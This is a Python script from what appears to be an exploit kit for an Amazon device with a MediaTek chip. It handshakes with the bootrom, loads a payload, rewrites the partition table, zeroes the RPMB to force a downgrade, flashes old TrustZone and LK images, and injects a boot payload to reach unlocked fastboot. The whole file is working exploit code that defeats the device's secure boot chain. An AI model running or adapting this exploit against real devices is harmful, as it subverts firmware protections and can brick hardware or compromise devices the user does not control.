#!/usr/bin/env python3
import sys
import struct
import os
import sys

from common import Device
from handshake import handshake
from load_payload import load_payload
from logger import log
from functions import *
from gpt import parse_gpt_compat, generate_gpt, modify_step1, modify_step2, parse_gpt as gpt_parse_gpt

def main():

    minimal = False

    check_modemmanager()

    dev = Device()
    dev.find_device()

    # 0.1) Handshake
    handshake(dev)

    # 0.2) Load brom payload
    load_payload(dev, "../brom-payload/build/payload.bin")

    if len(sys.argv) == 2 and sys.argv[1] == "minimal":
        log("Running in minimal mode, assuming LK and TZ to have already been flashed.")
        log("If this is correct (i.e. you used \"brick\" option in step 1) press enter, otherwise terminate with Ctrl+C")
        input()
        minimal = True

    # 1) Sanity check GPT
    log("Check GPT")
    switch_user(dev)

    # 1.1) Parse gpt
    gpt, gpt_header, part_list = parse_gpt(dev)
    #log("gpt_parsed = {}".format(gpt))
    if "lk" not in gpt or "tee1" not in gpt or "boot" not in gpt or "recovery" not in gpt:
        raise RuntimeError("bad gpt")

    if "boot_x" not in gpt or "recovery_x" not in gpt:
        log("Modify GPT")

        if "boot_tmp" not in gpt and "recovery_tmp" not in gpt:
            part_list_mod1 = modify_step1(part_list)
        else:
            part_list_mod1 = part_list

        part_list_mod2 = modify_step2(part_list_mod1)
        primary, backup = generate_gpt(gpt_header, part_list_mod2)

        log("Validate GPT")
        gpt_header, part_list = gpt_parse_gpt(bytes(primary))

        log("Flash new primary GPT")
        flash_data(dev, primary, 0)

        log("Flash new backup GPT")
        flash_data(dev, backup, gpt_header['last_lba'] + 1)

        gpt, gpt_header, part_list = parse_gpt(dev)
        #log("gpt_parsed = {}".format(gpt))
        if "boot_x" not in gpt or "recovery_x" not in gpt:
            raise RuntimeError("bad gpt")

    # 2) Sanity check boot0
    log("Check boot0")
    switch_boot0(dev)

    # 3) Sanity check rpmb
    log("Check rpmb")
    rpmb = dev.rpmb_read()
    if rpmb[0:4] != b"AMZN":
        log("rpmb looks broken; if this is expected (i.e. you're retrying the exploit) press enter, otherwise terminate with Ctrl+C")
        input()

    # Clear preloader so, we get into bootrom without shorting, should the script stall (we flash preloader as last step)
    # 10) Downgrade preloader
    log("Clear preloader header")
    switch_boot0(dev)
    flash_data(dev, b"EMMC_BOOT" + b"\x00" * ((0x200 * 8) - 9), 0)

    # 4) Zero out rpmb to enable downgrade
    log("Downgrade rpmb")
    dev.rpmb_write(b"\x00" * 0x100)
    log("Recheck rpmb")
    rpmb = dev.rpmb_read()
    if rpmb != b"\x00" * 0x100:
        dev.reboot()
        raise RuntimeError("downgrade failure, giving up")
    log("rpmb downgrade ok")

    if not minimal:
        # 7) Downgrade tz
        log("Flash tz")
        switch_user(dev)
        flash_binary(dev, "../bin/tz.img", gpt["tee1"][0], gpt["tee1"][1] * 0x200)

        # 8) Downgrade lk
        log("Flash lk")
        switch_user(dev)
        flash_binary(dev, "../bin/lk.bin", gpt["lk"][0], gpt["lk"][1] * 0x200)

    # 9) Flash payload
    log("Inject payload")
    switch_user(dev)
    flash_binary(dev, "../bin/boot.hdr", gpt["boot"][0], gpt["boot"][1] * 0x200)
    flash_binary(dev, "../bin/boot.payload", gpt["boot"][0] + 223223, (gpt["boot"][1] * 0x200) - (223223 * 0x200))
    
    switch_user(dev)
    flash_binary(dev, "../bin/boot.hdr", gpt["recovery"][0], gpt["recovery"][1] * 0x200)
    flash_binary(dev, "../bin/boot.payload", gpt["recovery"][0] + 223223, (gpt["recovery"][1] * 0x200) - (223223 * 0x200))

    log("Force fastboot")
    force_fastboot(dev, gpt)

    # Flash preloader as last step, so we still have access to bootrom, should the script stall
    # 10) Downgrade preloader
    log("Flash preloader")
    switch_boot0(dev)
    flash_binary(dev, "../bin/boot0short.img", 0)
    flash_binary(dev, "../bin/preloader.bin", 520)

    # Reboot (to fastboot)
    log("Reboot to unlocked fastboot")
    dev.reboot()


if __name__ == "__main__":
    main()
